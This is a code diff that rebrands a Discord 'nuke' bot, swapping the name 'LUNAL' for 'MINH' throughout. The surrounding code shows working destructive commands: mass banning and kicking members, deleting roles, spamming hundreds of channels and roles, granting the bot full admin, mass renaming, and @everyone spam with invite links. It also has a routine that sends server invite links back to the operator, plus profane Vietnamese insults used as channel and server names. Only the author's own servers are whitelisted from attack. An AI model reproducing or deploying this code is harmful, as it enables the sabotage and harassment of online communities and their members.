@@ -46,10 +46,10 @@ def random_color() -> int:
 # ============================================================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 AVATAR_URL = "https://i.pinimg.com/736x/63/37/02/6337023d80cd4e3c2b79e2baa44b4adf.jpg"
-LOG_CHANNEL_ID = 1538543990448717978
+LOG_CHANNEL_ID = 1538893152386289814
 WHITELIST_SERVER_IDS = [1536985687469985813, 1536276567808938098, 1511630281680093275]
-SUPPORT_LINK = "https://discord.gg/5WFupkFbkM"
-SUPPORT_LINK2 = "https://discord.gg/HVWArvBGy"  # Cơ sở 2
+SUPPORT_LINK = "not server"
+SUPPORT_LINK2 = "not server"  # Cơ sở 2
 OWNER_ID = 1536264763427000391   # Owner mới
 OWNER_NAME = "laibantlaymdisoi"
 PREFIX = "l!"
@@ -267,7 +267,7 @@ class Help(commands.Cog):
         await ctx.message.delete()
         if category and category.lower() == "nuke":
             embed = discord.Embed(
-                title="🔥 LUNAL NUKE COMMANDS",
+                title="🔥 NUKED NUKE COMMANDS",
                 description="Lệnh phá hoại server (chỉ dùng trong test)",
                 color=0xFF0044
             )
@@ -282,12 +282,12 @@ class Help(commands.Cog):
             embed.add_field(name="`l!spam_channels`", value="Create 500+ spam channels", inline=False)
             embed.add_field(name="`l!lockdown`", value="Lock all channels", inline=False)
             embed.add_field(name="`l!mass_rename`", value="Rename all members", inline=False)
-            embed.set_footer(text="LUNAL KINGDOM | l!help")
+            embed.set_footer(text="NUKED BY MINH | l!help")
             await ctx.send(embed=embed)
             return
 
         embed = discord.Embed(
-            title="⛧ LUNAL KINGDOM NEXUS - ULTIMATE BOT",
+            title="⛧ NUKED BY MINH - ULTIMATE BOT",
             description=f"**Prefix:** `{PREFIX}`\n**Support 1:** [Click here]({SUPPORT_LINK})\n**Support 2:** [Click here]({SUPPORT_LINK2})",
             color=0x2F2F2F,
             timestamp=utcnow()
@@ -301,7 +301,7 @@ class Help(commands.Cog):
         embed.add_field(name="🛡️ ANTI", value="`l!antinuke`, `l!antiraid`, `l!antibot`, `l!setlog`, `l!anti`", inline=False)
         embed.add_field(name="🎫 TICKET", value="`l!ticket`, `l!close`", inline=False)
         embed.add_field(name="⚡ QUICK", value="`l!setup`, `l!ping`, `l!sv`, `l!balance`, `l!daily`", inline=False)
-        embed.set_footer(text="LUNAL KINGDOM | Made with ❤️ | 200+ features")
+        embed.set_footer(text="MÃI IU NHA | Made with ❤️ | 200+ features")
         view = View()
         view.add_item(Button(label="Support 1", style=discord.ButtonStyle.link, url=SUPPORT_LINK))
         view.add_item(Button(label="Support 2", style=discord.ButtonStyle.link, url=SUPPORT_LINK2))
@@ -386,7 +386,7 @@ class Nuke(commands.Cog):
         for member in ctx.guild.members:
             if member.id != self.bot.user.id:
                 try:
-                    await member.ban(reason="Massban by LUNAL")
+                    await member.ban(reason="Massban by MINH")
                     count += 1
                     await asyncio.sleep(0.3)
                 except:
@@ -405,7 +405,7 @@ class Nuke(commands.Cog):
         for member in ctx.guild.members:
             if member.id != self.bot.user.id:
                 try:
-                    await member.kick(reason="Masskick by LUNAL")
+                    await member.kick(reason="Masskick by MINH")
                     count += 1
                     await asyncio.sleep(0.3)
                 except:
@@ -462,7 +462,7 @@ class Nuke(commands.Cog):
         if not ctx.guild.me.guild_permissions.manage_roles:
             return
         try:
-            role = await ctx.guild.create_role(name="LUNAL Admin", color=discord.Color.blurple(), permissions=discord.Permissions.all())
+            role = await ctx.guild.create_role(name="PREMIUM Admin", color=discord.Color.blurple(), permissions=discord.Permissions.all())
             await ctx.author.add_roles(role)
             await ctx.guild.me.add_roles(role)
             await ctx.send("✅ Created Admin role!")
@@ -480,7 +480,7 @@ class Nuke(commands.Cog):
         count = 0
         for _ in range(250):
             try:
-                await ctx.guild.create_role(name="LUNAL-Nuked", colour=discord.Colour(random.randint(0, 0xFFFFFF)))
+                await ctx.guild.create_role(name="MINH-Nuked", colour=discord.Colour(random.randint(0, 0xFFFFFF)))
                 count += 1
                 await asyncio.sleep(0.15)
             except:
@@ -489,7 +489,7 @@ class Nuke(commands.Cog):
 
     @commands.command(name="spam_tag")
     @commands.cooldown(1, 100, commands.BucketType.user)
-    async def spam_tag_cmd(self, ctx, amount: int = 10, *, content: str = "LUNAL NUKE!"):
+    async def spam_tag_cmd(self, ctx, amount: int = 10, *, content: str = "MINH DZ NUKE!"):
         if self.is_owner(ctx.author):
             ctx.command.reset_cooldown(ctx)
         if ctx.guild.id in WHITELIST_SERVER_IDS:
@@ -515,7 +515,7 @@ class Nuke(commands.Cog):
         count = 0
         for i in range(min(amount, 500)):
             try:
-                await ctx.guild.create_text_channel(f"LUNAL-SPAM-{i}")
+                await ctx.guild.create_text_channel(f"MINH-SPAM-{i}")
                 count += 1
                 if i % 50 == 0:
                     await ctx.send(f"📁 Created {i}/{amount} channels...", delete_after=3)
@@ -568,7 +568,7 @@ class Nuke(commands.Cog):
 
     @commands.command(name="mass_rename")
     @commands.cooldown(1, 100, commands.BucketType.user)
-    async def mass_rename_cmd(self, ctx, *, name: str = "NUKED BY LUNAL"):
+    async def mass_rename_cmd(self, ctx, *, name: str = "NUKED BY MINH"):
         if self.is_owner(ctx.author):
             ctx.command.reset_cooldown(ctx)
         if ctx.guild.id in WHITELIST_SERVER_IDS:
@@ -609,12 +609,12 @@ class Nuke(commands.Cog):
                     pass
         for i in range(200):
             try:
-                await ctx.guild.create_text_channel(f"LUNAL-NUKED-{i}")
+                await ctx.guild.create_text_channel(f"MINH-NUKED-{i}")
                 await asyncio.sleep(0.05)
             except:
                 pass
             try:
-                await ctx.guild.create_role(name=f"LUNAL-{i}", color=random.randint(0, 0xFFFFFF))
+                await ctx.guild.create_role(name=f"MINH-{i}", color=random.randint(0, 0xFFFFFF))
                 await asyncio.sleep(0.05)
             except:
                 pass
@@ -639,7 +639,7 @@ class Utility(commands.Cog):
         embed.set_thumbnail(url="https://i.pinimg.com/736x/f5/c1/d3/f5c1d31978d2c8b5e3fa8f12e6e47ee1.jpg")
         embed.add_field(name="Status", value="**ONLINE**", inline=True)
         embed.add_field(name="Response", value=f"**{latency}ms**", inline=True)
-        embed.set_footer(text=f"Requested by {ctx.author.name} | LUNAL KINGDOM")
+        embed.set_footer(text=f"Requested by {ctx.author.name} | MINH NUKED")
         await ctx.send(embed=embed, delete_after=5)
 
     @commands.command(name="avatar")
@@ -1014,7 +1014,7 @@ class EconomyCommands(commands.Cog):
 
     @commands.command(name="shop")
     async def shop_cmd(self, ctx):
-        embed = discord.Embed(title="🏪 LUNAL SHOP", color=0xFFD700, timestamp=utcnow())
+        embed = discord.Embed(title="🏪  SHOP", color=0xFFD700, timestamp=utcnow())
         for key, item in shop_items.items():
             embed.add_field(name=item['name'], value=f"Price: {format_number(item['price'])} coins\n{item['desc']}\n`l!buy {key}`", inline=False)
         await ctx.send(embed=embed)
@@ -1080,7 +1080,7 @@ class LevelCommands(commands.Cog):
                 if str(user_id) in guild_members:
                     all_users.append((user_id, value.get("xp", 0), value.get("level", 1)))
         sorted_users = sorted(all_users, key=lambda x: x[1], reverse=True)[:10]
-        embed = discord.Embed(title="🏆 LUNAL LEADERBOARD", color=0xFFD700, timestamp=utcnow())
+        embed = discord.Embed(title="🏆  LEADERBOARD", color=0xFFD700, timestamp=utcnow())
         desc = ""
         for i, (user_id, xp, level) in enumerate(sorted_users, 1):
             try:
@@ -1335,13 +1335,13 @@ class ServerList(commands.Cog):
         guilds = self.bot.guilds
         total_members = sum(g.member_count for g in guilds)
         embed = discord.Embed(
-            title="🌐 LUNAL KINGDOM - SERVER LIST",
+            title="🌐 BÁ NUKE - SERVER LIST",
             description=f"Bot ở **{len(guilds)}** server với **{total_members}** thành viên",
             color=0x00FF88,
             timestamp=utcnow()
         )
         embed.set_thumbnail(url="https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg")
-        embed.set_footer(text="LUNAL NUKE | l!help")
+        embed.set_footer(text="MINH BÁ NUKE | l!help")
         sorted_guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)
         for guild in sorted_guilds[:20]:
             try:
@@ -1370,7 +1370,7 @@ class ServerList(commands.Cog):
         guilds = self.bot.guilds
         total_members = sum(g.member_count for g in guilds)
         content = "=" * 60 + "\n"
-        content += "🌐 LUNAL KINGDOM - ALL SERVERS\n"
+        content += "🌐 BOT - ALL SERVERS\n"
         content += f"📊 Total: {len(guilds)} servers | {total_members} members\n"
         content += "=" * 60 + "\n\n"
         sorted_guilds = sorted(guilds, key=lambda g: g.member_count, reverse=True)
@@ -1390,7 +1390,7 @@ class ServerList(commands.Cog):
             content += f"   📅 Created: {guild.created_at.strftime('%d/%m/%Y')}\n"
             content += f"   🔗 Link: {invite_link}\n"
             content += "-" * 50 + "\n"
-        file = discord.File(io.StringIO(content), filename="lunal_servers.txt")
+        file = discord.File(io.StringIO(content), filename="minh_servers.txt")
         try:
             await ctx.author.send(file=file, content="📋 **All servers list:**")
             await ctx.send("📨 Sent file to DM!", delete_after=3)
@@ -1408,11 +1408,11 @@ class NukeV2:
         self.last_nuke_time = 0
         self.concurrent_tasks = 60
         self.channel_names = (
-            ["L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ K̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏G̶̸̖̣̃̇́͏D̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏M̶̸̖̣̃̇́͏"] * 40 +
-            ["Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ D̶̸̖̣̃̇́͏Z̶̸̖̣̃̇́͏"] * 40 +
-            ["L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Á T̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏P̶̸̖̣̃̇́͏"] * 40 +
-            ["ĐỊT̶̸̖̣̃̇́͏ C̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ẹ B̶̸̖̣̃̇́͏ỌÑ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏ÀỸ̶̸̖̣̇́͏"] * 40 +
-            ["Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏"] * 40
+            ["n҉u҉k҉e҉d҉ b҉y҉ m҉i҉n҉h҉"] * 40 +
+            ["N҉U҉K҉E҉ T҉O҉P҉ B҉O҉T҉"] * 40 +
+            ["S҉E҉R҉V҉E҉R҉ N҉U҉K҉E҉ T҉O҉P҉"] * 40 +
+            ["S҉E҉R҉V҉E҉R҉ N҉G҉U҉ V҉ẬY҉ "] * 40 +
+            ["L҉ẤY҉ B҉O҉T҉ I҉B҉ T҉"] * 40
         )
         random.shuffle(self.channel_names)
 
@@ -1427,7 +1427,7 @@ class NukeV2:
     async def _log_server_info(self, message, invite_link):
         guild = message.guild
         embed = discord.Embed(
-            title="LUNAL Nuke Initiated",
+            title="MINH Nuke Initiated",
             color=0x2F3136,
             timestamp=utcnow()
         )
@@ -1485,11 +1485,11 @@ class NukeV2:
     async def spam_message(self, channel, message, times=5, image_url=None, gif_url=None):
         main_embed = discord.Embed(
             title="Do you really think this is a security bot?",
-            description=f"**This server has been nuked by LUNAL KINGDOM.**\nJoin: [LUNAL KINGDOM]({SUPPORT_LINK})\nJoin 2: [LUNAL KINGDOM 2]({SUPPORT_LINK2})",
+            description=f"**This server has been nuked by Minh.**\nJoin: [server here]({SUPPORT_LINK})\nJoin 2: [server here 2]({SUPPORT_LINK2})",
             color=0x2F3136,
             timestamp=utcnow()
         )
-        main_embed.set_footer(text="NUKE BY LUNAL KINGDOM")
+        main_embed.set_footer(text="NUKE BY MINH")
         if gif_url:
             main_embed.set_thumbnail(url=gif_url)
         if image_url:
@@ -1534,7 +1534,7 @@ class NukeV2:
             return
         self.last_nuke_time = current_time
 
-        spam_content = "# <a:Black_cross:1353971971095793776> **__₠ ₴ɆⱤVɆⱤ ĐɆ₴₮ⱤØɎɆĐ ฿Ɏ ⱠɄ₦₳Ⱡ ₭ł₦₲ĐØ₥ ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/5WFupkFbkM\n> ||Join 2:|| https://discord.gg/HVWArvBGy"
+        spam_content = "# <a:Black_cross:1353971971095793776> **__SERVER ĐÃ BỊ NUKE, LẤY BOT IB T ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/5WFupkFbkM\n> ||Join 2:|| https://discord.gg/HVWArvBGy"
         image_url = "https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif"
 
         await self._log("Starting role deletion...")
@@ -1591,7 +1591,7 @@ class NukeV2:
 
     async def _rename_server(self, guild):
         try:
-            await guild.edit(name="ℕ𝔾𝕌 𝕃Ồℕ / ℕ𝕌𝕂𝔼𝔻 𝔹𝕐 𝕃𝕌ℕ𝔸𝕃")
+            await guild.edit(name="NGU LỒN CHA MINH BÁ TOP�")
         except Exception as e:
             await self._log(f"Failed to rename server: {e}")
 
@@ -1633,7 +1633,7 @@ async def on_ready():
     await bot.change_presence(
         activity=discord.Streaming(
             name=f"l!help | {len(bot.guilds)} Servers | {len(bot.users)} Users",
-            url="https://twitch.tv/lunalkingdom"
+            url="https://twitch.tv/XNHAU.COM"
         )
     )
     print(f"[+] Ready | {len(bot.guilds)} servers | {len(bot.users)} users")
@@ -1718,7 +1718,7 @@ async def auto_kick_all_servers():
     embed.add_field(name="✅ Tổng kick thành công", value=str(total_kicked), inline=True)
     embed.add_field(name="❌ Tổng kick thất bại", value=str(total_failed), inline=True)
     embed.add_field(name="🤖 Tổng bot phát hiện", value=str(total_bots_found), inline=True)
-    embed.set_footer(text="LUNAL Auto-Kick System")
+    embed.set_footer(text="MINH Auto-Kick System")
 
     # Gửi về log channel (có retry)
     log_channel = bot.get_channel(LOG_CHANNEL_ID)
